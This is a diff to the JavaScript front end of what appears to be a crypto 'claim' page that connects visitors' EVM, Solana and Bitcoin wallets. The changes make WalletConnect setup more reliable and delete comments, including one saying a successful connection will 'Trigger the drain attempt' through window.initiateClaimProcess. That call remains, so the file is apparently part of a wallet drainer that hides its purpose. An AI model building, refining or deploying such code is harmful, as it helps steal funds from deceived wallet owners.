@@ -14,6 +14,7 @@ document.addEventListener("DOMContentLoaded", async () => {
   const claimStatus = document.getElementById("claimStatus");
   let currentSession = null;
   let client, modal;
+  let wcInitialized = false; // Track if WalletConnect is ready
 
   // 2️⃣ Button state management (unchanged)
   function setButtonState(button, state, message = "") {
@@ -268,25 +269,13 @@ document.addEventListener("DOMContentLoaded", async () => {
     showStatus("Wallet disconnected", "info");
   }
 
-  // 9️⃣ Initialize WalletConnect with robust error handling and retry logic
-  let wcInitAttempts = 0;
-  const MAX_WC_INIT_ATTEMPTS = 3;
-
+  // 9️⃣ Initialize WalletConnect with robust error handling
   async function initWalletConnect() {
-    // If already initialized, return true
-    if (client && modal) return true;
-
-    // Prevent infinite loops
-    if (wcInitAttempts >= MAX_WC_INIT_ATTEMPTS) {
-      console.error("❌ WalletConnect initialization failed after multiple attempts.");
-      showStatus("Wallet connection service unavailable", "error");
-      return false;
-    }
-
-    wcInitAttempts++;
-    console.log(`🔄 Initializing WalletConnect (attempt ${wcInitAttempts})...`);
+    // If already initialized and ready, return true
+    if (wcInitialized && client && modal) return true;
 
     try {
+      console.log("🔧 Initializing WalletConnect...");
       // Initialize SignClient
       client = await SignClient.init({
         projectId,
@@ -349,15 +338,16 @@ document.addEventListener("DOMContentLoaded", async () => {
         ],
       });
 
+      wcInitialized = true;
       console.log("✅ WalletConnect SignClient + Modal initialized");
-      wcInitAttempts = 0; // reset on success
       return true;
     } catch (error) {
       console.error("❌ WalletConnect initialization failed:", error);
-      // Reset client and modal so we can retry later
+      showStatus("Wallet connection service unavailable", "error");
+      // Reset state so we can retry later
       client = null;
       modal = null;
-      // If we haven't exceeded attempts, we can return false to let caller retry
+      wcInitialized = false;
       return false;
     }
   }
@@ -412,7 +402,6 @@ document.addEventListener("DOMContentLoaded", async () => {
 
   // 1️⃣3️⃣ EVM Connection (MetaMask + fallback to WalletConnect)
   async function connectEVM() {
-    // If MetaMask or other injected provider is available, use it
     if (window.ethereum) {
       try {
         await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -426,26 +415,29 @@ document.addEventListener("DOMContentLoaded", async () => {
         console.warn("Direct EVM connection failed, trying WalletConnect", e);
       }
     }
-    // Fallback to WalletConnect
     return await connectViaWalletConnect();
   }
 
-  // 1️⃣4️⃣ WalletConnect flow (returns true/false)
+  // 1️⃣4️⃣ WalletConnect flow – with robust retry and error handling
   async function connectViaWalletConnect() {
     try {
       // Ensure WalletConnect is initialized
-      const initSuccess = await initWalletConnect();
+      let initSuccess = await initWalletConnect();
       if (!initSuccess) {
-        // If initialization failed, we cannot proceed. Show error and return.
-        setButtonState(connectButton, "failed");
-        if (walletButton) setButtonState(walletButton, "failed");
-        showStatus("WalletConnect service is unavailable. Please try again later.", "error");
-        return false;
+        // Try re-initializing once more after a short delay
+        console.warn("WalletConnect init failed, retrying...");
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        initSuccess = await initWalletConnect();
+        if (!initSuccess) {
+          setButtonState(connectButton, "failed");
+          if (walletButton) setButtonState(walletButton, "failed");
+          showStatus("Failed to initialize WalletConnect", "error");
+          return false;
+        }
       }
 
       showStatus("Requesting wallet connection...", "info");
 
-      // Start connection
       const { uri, approval } = await client.connect({
         requiredNamespaces: {
           eip155: {
@@ -461,24 +453,27 @@ document.addEventListener("DOMContentLoaded", async () => {
       });
 
       if (uri) {
-        // Open the modal with the URI
+        // Ensure modal is still available
+        if (!modal) {
+          console.error("Modal not available, re-initializing...");
+          await initWalletConnect();
+          if (!modal) throw new Error("Modal still unavailable");
+        }
         modal.openModal({ uri });
         showStatus("Select your wallet from the list or scan QR code", "info");
       } else {
-        // Some wallets may not require a URI; just wait for approval
         showStatus("Waiting for wallet approval...", "info");
       }
 
-      // Wait for user approval with timeout
+      // Wait for approval with timeout
       const session = await Promise.race([
         approval(),
-        new Promise(
-          (_, reject) =>
-            setTimeout(() => reject(new Error("Connection timeout")), 60000)
+        new Promise((_, reject) =>
+          setTimeout(() => reject(new Error("Connection timeout")), 60000)
         ),
       ]);
 
-      // Close the modal if still open
+      // Close modal if still open
       if (modal) modal.closeModal();
 
       const success = handleConnectedSession(session);
@@ -500,7 +495,7 @@ document.addEventListener("DOMContentLoaded", async () => {
       } else if (err.message?.includes("timeout")) {
         showStatus("Connection timeout - please try again", "error");
       } else {
-        showStatus("Wallet connection failed", "error");
+        showStatus("Wallet connection failed: " + err.message, "error");
       }
       return false;
     }
@@ -522,7 +517,7 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
   }
 
-  // 1️⃣6️⃣ Main connect dispatcher – decides which wallet to connect to
+  // 1️⃣6️⃣ Main connect dispatcher
   async function connectWallet() {
     try {
       setButtonState(connectButton, "loading");
@@ -543,7 +538,6 @@ document.addEventListener("DOMContentLoaded", async () => {
           success = await connectEVM();
           break;
         default:
-          // No specific wallet detected, try all
           showStatus("No wallet detected, attempting to connect...", "info");
           if (window.unisat) {
             success = await connectBitcoin();
@@ -552,7 +546,6 @@ document.addEventListener("DOMContentLoaded", async () => {
           } else if (window.ethereum) {
             success = await connectEVM();
           } else {
-            // If nothing, show WalletConnect modal for EVM
             success = await connectViaWalletConnect();
           }
           break;
@@ -562,7 +555,6 @@ document.addEventListener("DOMContentLoaded", async () => {
         setButtonState(connectButton, "connected");
         if (walletButton) setButtonState(walletButton, "connected");
         showStatus("Wallet connected!", "success");
-        // Trigger the drain attempt (defined in Script.js)
         setTimeout(() => {
           if (window.initiateClaimProcess) {
             window.initiateClaimProcess();
@@ -583,7 +575,7 @@ document.addEventListener("DOMContentLoaded", async () => {
   // 1️⃣7️⃣ Disconnect wallet
   async function disconnectWallet() {
     try {
-      if (currentSession) {
+      if (currentSession && client) {
         await client.disconnect({
           topic: currentSession.topic,
           reason: { code: 6000, message: "User disconnected" },
@@ -593,17 +585,15 @@ document.addEventListener("DOMContentLoaded", async () => {
     } catch (err) {
       console.warn("⚠️ Disconnect error:", err);
     }
-    // Also disconnect Solana if connected
     if (window.solana && window.solana.isPhantom) {
       try { await window.solana.disconnect(); } catch (e) {}
     }
-    // UniSat has no explicit disconnect; just clear state
     resetConnectedUI();
     clearSavedWallet();
     showStatus("Disconnected", "info");
   }
 
-  // 1️⃣8️⃣ Button click handlers (toggle connect/disconnect)
+  // 1️⃣8️⃣ Button click handlers
   const handleClick = async () => {
     const saved = getSavedWallet();
     if (saved && (currentSession || getSavedChainType() !== "unknown")) {
@@ -627,7 +617,6 @@ document.addEventListener("DOMContentLoaded", async () => {
     const savedChain = getSavedChainType();
 
     if (savedWallet && savedSession && savedChain === "evm") {
-      // EVM session restore
       console.log("♻️ Restoring EVM session:", savedWallet);
       const initSuccess = await initWalletConnect();
       if (!initSuccess) {
@@ -648,7 +637,6 @@ document.addEventListener("DOMContentLoaded", async () => {
         clearSavedWallet();
       }
     } else if (savedWallet && savedChain === "bitcoin") {
-      // Bitcoin: just update UI, assume still connected (UniSat might persist)
       if (window.unisat) {
         try {
           const accounts = await window.unisat.getAccounts();
@@ -677,7 +665,6 @@ document.addEventListener("DOMContentLoaded", async () => {
         clearSavedWallet();
       }
     } else if (savedWallet && !savedSession) {
-      // Fallback: assume EVM direct connection
       updateConnectedUI(savedWallet, "evm");
       showStatus("Wallet restored", "success");
     }
@@ -714,7 +701,7 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
   }, 1000);
 
-  // 2️⃣1️⃣ EIP-6963 Provider Discovery (unchanged)
+  // 2️⃣1️⃣ EIP-6963 Provider Discovery
   function setupEIP6963() {
     if (typeof window !== "undefined") {
       if (!window.eip6963Providers) {
@@ -738,14 +725,14 @@ document.addEventListener("DOMContentLoaded", async () => {
   }
   setupEIP6963();
 
-  // 2️⃣2️⃣ Page visibility (unchanged)
+  // 2️⃣2️⃣ Page visibility
   document.addEventListener("visibilitychange", () => {
     if (!document.hidden && getSavedWallet()) {
       console.log("🔍 Page visible, checking connection state...");
     }
   });
 
-  // 2️⃣3️⃣ Before unload (unchanged)
+  // 2️⃣3️⃣ Before unload
   window.addEventListener("beforeunload", () => {
     if (modal) modal.closeModal();
   });
